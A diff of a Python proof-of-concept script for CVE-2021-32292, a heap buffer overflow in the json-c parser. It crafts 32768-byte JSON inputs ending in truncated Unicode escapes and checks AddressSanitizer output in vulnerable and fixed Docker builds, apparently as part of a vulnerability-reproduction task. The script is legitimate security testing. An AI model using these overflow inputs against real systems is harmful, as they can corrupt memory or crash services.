@@ -5,21 +5,22 @@ import sys
 def generate_poc():
     print("[*] Generating PoC to trigger heap buffer overflow...")
     
-    # El bug ocurre cuando start_pos + parse_end >= sizeof(buf)
-    # buf es de 32768 bytes
-    # Necesitamos que el error ocurra exactamente en el byte 32768
+    # El problema: necesitamos que el error ocurra EXACTAMENTE en buf[32767]
+    # para que start_pos + parse_end = 32768 (fuera del buffer)
     
-    # Formato: {"a":"AAA...\x01
-    # donde \x01 es un carácter de control inválido en posición 32768
+    # Estrategia nueva: JSON con escape sequence inválida al final
+    # {"a":"AAA...\uXXXX donde \uXXXX está incompleto y causa error
     
     prefix = b'{"a":"'
-    suffix = b'\x01'
+    # Secuencia de escape Unicode incompleta/inválida
+    # \u debe ir seguido de 4 dígitos hex, usaremos solo 3
+    invalid_escape = b'\\u12'  # Falta un dígito - error en parsing
     
-    # Total debe ser 32768 para que el último byte cause el error
-    # y start_pos + parse_end apunte fuera del buffer
-    padding_length = 32768 - len(prefix) - len(suffix)
+    # Calcular padding para llegar exactamente a 32768
+    # El error debe ocurrir en el último byte leído
+    padding_length = 32768 - len(prefix) - len(invalid_escape)
     
-    payload = prefix + (b'A' * padding_length) + suffix
+    payload = prefix + (b'A' * padding_length) + invalid_escape
     
     if len(payload) != 32768:
         print(f"ERROR: Payload is {len(payload)} bytes, expected 32768")
@@ -29,11 +30,12 @@ def generate_poc():
         f.write(payload)
     
     print(f"    Created manual_seed.json ({len(payload)} bytes)")
-    print(f"    First 10 bytes: {payload[:10]}")
-    print(f"    Last 10 bytes: {payload[-10:]}")
+    print(f"    Ends with: {payload[-20:]}")
+    return payload
 
-def run_test(service_name):
-    print(f"\n[*] Testing {service_name}...")
+def test_direct(service_name):
+    """Test without ASan to see actual parsing behavior"""
+    print(f"\n[DEBUG] Testing {service_name} behavior...")
     cmd = [
         "docker", "compose", 
         "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
@@ -43,68 +45,71 @@ def run_test(service_name):
         "/usr/local/bin/json_parse", "/input/seed.bin"
     ]
     
-    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    code = result.returncode
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    print(f"    Exit code: {result.returncode}")
+    print(f"    STDOUT: {result.stdout[:200] if result.stdout else '(empty)'}")
+    print(f"    STDERR: {result.stderr[:500] if result.stderr else '(empty)'}")
     
-    # Check for ASan detection
-    if "heap-buffer-overflow" in result.stderr or "AddressSanitizer" in result.stderr:
-        print("    🔍 AddressSanitizer detected heap-buffer-overflow!")
-        # Show relevant lines
-        for line in result.stderr.split('\n'):
-            if 'heap-buffer-overflow' in line or 'READ of size' in line or 'json_parse.c' in line:
-                print(f"    {line}")
-    
-    if result.stdout:
-        stdout_preview = result.stdout[:200]
-        print(f"    STDOUT: {stdout_preview}")
-    
-    icon = "❓"
-    if code == 1 and "AddressSanitizer" in result.stderr:
-        icon = "💥 ASAN DETECTED OVERFLOW"
-    elif code == 139:
-        icon = "💥 SEGFAULT"
-    elif code == 0:
-        icon = "✅ OK"
-    elif code == 1:
-        icon = "⚠️  ERROR"
-    
-    print(f"    Exit Code: {code}  {icon}")
-    return code, result.stderr
+    return result
 
 def main():
-    generate_poc()
+    payload = generate_poc()
     
-    print("\n=== Building containers with AddressSanitizer ===")
-    subprocess.run([
-        "docker", "compose",
-        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
-        "build", "--no-cache"
-    ])
+    print("\n=== Testing to see what happens ===")
     
-    print("\n=== Testing with AddressSanitizer ===")
+    # Test both to see the difference
+    result_vuln = test_direct("target-vuln")
+    result_fixed = test_direct("target-fixed")
     
-    code_vuln, stderr_vuln = run_test("target-vuln")
-    code_fixed, stderr_fixed = run_test("target-fixed")
+    # Check if we triggered the error path
+    vuln_has_asan = "AddressSanitizer" in result_vuln.stderr
+    vuln_has_error = "Failed at offset" in result_vuln.stderr
     
-    print("\n=== RESULTS ===")
+    fixed_has_asan = "AddressSanitizer" in result_fixed.stderr
+    fixed_has_error = "Failed at offset" in result_fixed.stderr or "error at end of input" in result_fixed.stderr
     
-    vuln_detected = "AddressSanitizer" in stderr_vuln and "heap-buffer-overflow" in stderr_vuln
-    fixed_ok = "AddressSanitizer" not in stderr_fixed or "heap-buffer-overflow" not in stderr_fixed
+    print("\n=== Analysis ===")
+    if vuln_has_error:
+        print("✓ Vulnerable version hit error path")
+        if vuln_has_asan:
+            print("✓ ASan detected heap overflow in vulnerable!")
+        else:
+            print("✗ ASan did NOT detect overflow (might be within same page)")
+    else:
+        print("✗ Vulnerable version did NOT hit error path")
+        print("  The PoC is not causing a parse error")
+        
+    if fixed_has_error:
+        print("✓ Fixed version hit error path")
+        if not fixed_has_asan:
+            print("✓ Fixed version handled error safely")
+        else:
+            print("✗ Fixed version also triggered ASan")
     
-    success = vuln_detected and fixed_ok
+    print("\n=== Trying alternative PoCs ===")
     
-    if success:
-        print("✅ SUCCESS!")
-        print("   - Vulnerable version: ASan detected heap-buffer-overflow")
-        print("   - Fixed version: No overflow detected")
-    elif not vuln_detected:
-        print("❌ FAIL: ASan did not detect overflow in vulnerable version")
-        print("   The PoC may not be triggering the vulnerable code path")
-    elif not fixed_ok:
-        print("❌ FAIL: Fixed version also shows overflow")
-        print("   The fix may not be effective")
+    # Alternative 1: Truncated unicode escape at exact boundary
+    alt_payloads = [
+        (b'{"a":"' + b'A' * 32760 + b'\\u123', "Truncated \\u escape"),
+        (b'{"a":"' + b'A' * 32761 + b'\\u12', "Shorter \\u escape"),
+        (b'{"a":"' + b'A' * 32762 + b'\\u1', "Very short \\u escape"),
+        (b'{"a":"' + b'A' * 32761 + b'\\xFF', "Invalid escape char"),
+    ]
     
-    sys.exit(0 if success else 1)
+    for alt_payload, desc in alt_payloads:
+        if len(alt_payload) != 32768:
+            continue
+        print(f"\nTrying: {desc}")
+        with open("manual_seed.json", "wb") as f:
+            f.write(alt_payload)
+        
+        result = test_direct("target-vuln")
+        if "Failed at offset" in result.stderr:
+            print(f"  ✓ This triggers the error path!")
+            if "AddressSanitizer" in result.stderr:
+                print(f"  ✓ ASan detected overflow!")
+                print("\n✅ FOUND WORKING POC!")
+                break
 
 if __name__ == "__main__":
     main()
